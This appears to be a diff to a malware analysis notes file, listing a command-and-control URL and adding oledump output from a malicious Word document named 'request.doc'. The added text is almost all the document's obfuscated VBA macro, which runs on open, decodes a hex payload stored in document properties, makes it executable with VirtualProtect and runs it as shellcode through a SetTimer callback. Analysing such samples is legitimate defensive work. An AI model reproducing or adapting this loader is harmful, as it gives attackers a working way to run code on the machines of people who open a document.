@@ -25,3 +25,89 @@ C:\Windows\system32\WerFault.exe -u -p 988 -s 168
 
 c2'
 http://golinisye.top/
+
+
+***************************************
+
+oledump.py -s 3 -v request.doc
+
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+#If VBA7 Then
+Private Declare PtrSafe Function UnperceptualSurgical Lib "user32" Alias "SetTimer" (ByVal CeciliaSubventralQuodlibetarian As LongPtr, ByVal AndropetalarSeparationismTransiliac As LongPtr, ByVal ExaggeratinglySaintism As LongPtr, ByVal CordewaneCourtierism As LongPtr) As LongPtr
+Private Declare PtrSafe Function NitpickersUnintombed Lib "user32" Alias "KillTimer" (ByVal ThirdlyKopagmiut As LongPtr, ByVal NondisarmamentShrivellingTemptingness As LongPtr) As LongPtr
+Private Declare PtrSafe Function ProofreadingFallalery Lib "kernel32" Alias "VirtualProtect" (ByVal CarburizeEudemonistically As LongPtr, ByVal UntritelyKinetomeric As LongPtr, ByVal MedallaryTimeworkerJinrikisha As LongPtr, MatronaliaGigantostracous As LongPtr) As LongPtr
+#Else
+Private Declare Function UnperceptualSurgical Lib "user32" Alias "SetTimer" ( ByVal ChoreographySistrurusUnintoxicating As Long, ByVal VerbenasApennines As Long, ByVal BrominHalicarnassian As Long, ByVal WantonerAraliaceousGadolinia As Any) As Long
+Private Declare Function NitpickersUnintombed Lib "user32" Alias "KillTimer" ( ByVal SubnarcoticPseudoaestheticSniggeringly As Long, ByVal ThromboclasisWondercraft As Long) As Long
+Private Declare Function ProofreadingFallalery Lib "kernel32" Alias "VirtualProtect"  (ByVal OverpiousnessDividedly As Long, ByVal SclerificationDelocalizationWhinnel As Long, ByVal SailfishLententideHeavyset As Long, NarcobatusUpsilons As Long) As Long
+#End If
+Private Sub Document_Open()
+AntisidericCretinBonhomie
+End Sub
+Public Function hoCHrGBZH(strInput)
+hoCHrGBZH = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
+End Function
+Private Sub AntisidericCretinBonhomie()
+Dim EndorserMavourneen() As Byte
+#If Win64 Then
+EndorserMavourneen = RenovizeSpectrophotometerPsoai(ActiveDocument.BuiltInDocumentProperties(hoCHrGBZH("ZTaqhc9jX")).Value)
+#Else
+EndorserMavourneen = RenovizeSpectrophotometerPsoai(ActiveDocument.BuiltInDocumentProperties(hoCHrGBZH("gIU5oWu8r")).Value)
+#End If
+#If VBA7 Then
+Dim ColostomiesExcitesAnalogions As LongPtr
+Dim StayableTitanosilicate As LongPtr
+Dim shellCode As LongPtr
+Dim ExpatiationMonorailroad As LongPtr
+#Else
+Dim ColostomiesExcitesAnalogions As Long
+Dim StayableTitanosilicate As Long
+Dim shellCode As Long
+Dim ExpatiationMonorailroad As Long
+#End If
+StayableTitanosilicate = UBound(EndorserMavourneen) + 1
+shellCode = VarPtr(EndorserMavourneen(0))
+ProofreadingFallalery shellCode, StayableTitanosilicate, 64, VarPtr(ColostomiesExcitesAnalogions)
+GetObject(hoCHrGBZH("zFrJxQ__yDJx")).Environment(hoCHrGBZH("vcDz__"))(hoCHrGBZH("WqQLObjnCSb")) = hoCHrGBZH("q2rYW_M")
+ExpatiationMonorailroad = UnperceptualSurgical(0, shellCode, 1, shellCode)
+UndeludingSectionality 1
+NitpickersUnintombed 0, ExpatiationMonorailroad
+GetObject(hoCHrGBZH("gwNLW1Bay4")).Environment(hoCHrGBZH("ScmozQXgoo4ly")).Remove (hoCHrGBZH("cKK3lrHG"))
+ReDim EndorserMavourneen(1)
+End Sub
+Sub UndeludingSectionality(Finish)
+Dim HypothecatingSickle As Long
+Dim ChorepiscopeQuotiesTorsks As Long
+ChorepiscopeQuotiesTorsks = Timer() + (Finish)
+Do
+HypothecatingSickle = Timer()
+DoEvents
+Loop Until HypothecatingSickle > ChorepiscopeQuotiesTorsks
+End Sub
+Function HackberriesZaninesses(AnatomicobiologicalRattlyPharyngopathy, ReaccumulatingCyanids)
+HackberriesZaninesses = Mid(AnatomicobiologicalRattlyPharyngopathy, ReaccumulatingCyanids + 1, 1)
+End Function
+Function FrostinessHomotonousCalmingly(FirebratsIdolisedUnerrableness) As Long
+If Int(Rnd(23)) > 2 Then
+FrostinessHomotonousCalmingly = 9000
+Else
+FrostinessHomotonousCalmingly = Len(FirebratsIdolisedUnerrableness)
+End If
+End Function
+Function RenovizeSpectrophotometerPsoai(AlgesiometerFerrotungstenScleria)
+ReDim ShotmakerBumbler(FrostinessHomotonousCalmingly(AlgesiometerFerrotungstenScleria) - 1) As Byte
+Dim EnharmonicCompunctionaryCichlidae As Long, BromomenorrheaUndefiniteQuadraphonics As Long
+Dim AxiomaticalNondeprecatingly: AxiomaticalNondeprecatingly = hoCHrGBZH("ePyzXTjr") & hoCHrGBZH("vq4yNZ0riO")
+For EnharmonicCompunctionaryCichlidae = 0 To FrostinessHomotonousCalmingly(AlgesiometerFerrotungstenScleria) - 1 Step 2
+BromomenorrheaUndefiniteQuadraphonics = EnharmonicCompunctionaryCichlidae / 2
+ShotmakerBumbler(BromomenorrheaUndefiniteQuadraphonics) = CDec(AxiomaticalNondeprecatingly & HackberriesZaninesses(AlgesiometerFerrotungstenScleria, EnharmonicCompunctionaryCichlidae) & HackberriesZaninesses(AlgesiometerFerrotungstenScleria, EnharmonicCompunctionaryCichlidae + 1))
+Next
+RenovizeSpectrophotometerPsoai = ShotmakerBumbler
+End Function
